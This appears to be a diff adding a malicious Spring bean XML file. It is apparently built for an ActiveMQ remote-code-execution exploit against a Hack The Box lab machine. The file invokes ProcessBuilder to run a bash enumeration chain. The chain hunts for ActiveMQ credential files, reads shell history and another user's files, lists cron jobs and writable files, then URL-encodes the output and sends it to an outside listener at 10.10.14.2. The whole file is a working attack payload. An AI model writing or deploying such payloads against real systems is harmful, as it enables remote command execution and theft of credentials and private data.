@@ -1,0 +1,28 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<beans xmlns="http://www.springframework.org/schema/beans"
+       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+       xsi:schemaLocation="http://www.springframework.org/schema/beans
+       http://www.springframework.org/schema/beans/spring-beans.xsd">
+    <bean id="pb" class="java.lang.ProcessBuilder">
+        <constructor-arg>
+            <list>
+                <value>/bin/bash</value>
+                <value>-c</value>
+                <value><![CDATA[echo "=ACTIVEMQ CONF="; find / -name "activemq.xml" -o -name "credentials.properties" -o -name "jetty-realm.properties" 2>/dev/null | head -5; echo "=ACTIVEMQ HOME="; find / -name "activemq" -type d 2>/dev/null | grep -v proc | head -5; ls /opt/ 2>/dev/null; ls /var/lib/ 2>/dev/null | grep -i activemq; echo "=SVCMQ FILES="; ls -la /home/svc_mq@king.htb/; echo "=HISTORY="; cat /home/svc_mq@king.htb/.bash_history 2>/dev/null; echo "=CRONS="; ls -la /etc/cron* 2>/dev/null; crontab -l 2>/dev/null; echo "=WRITABLE="; find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys | grep -v /tmp | grep -v /run | grep -v /dev | head -20; echo "=ANNE ACCESS="; cat /home/anne/.bashrc 2>/dev/null; ls -la /home/anne/]]></value>
+            </list>
+        </constructor-arg>
+    </bean>
+    <bean id="proc" factory-bean="pb" factory-method="start"/>
+    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
+    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
+          factory-method="copyToByteArray">
+        <constructor-arg ref="procOut"/>
+    </bean>
+    <bean id="outStr" class="java.lang.String">
+        <constructor-arg ref="outBytes"/>
+    </bean>
+    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
+        <constructor-arg value="#{'http://10.10.14.2:8080/enum3?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
+    </bean>
+    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
+</beans>
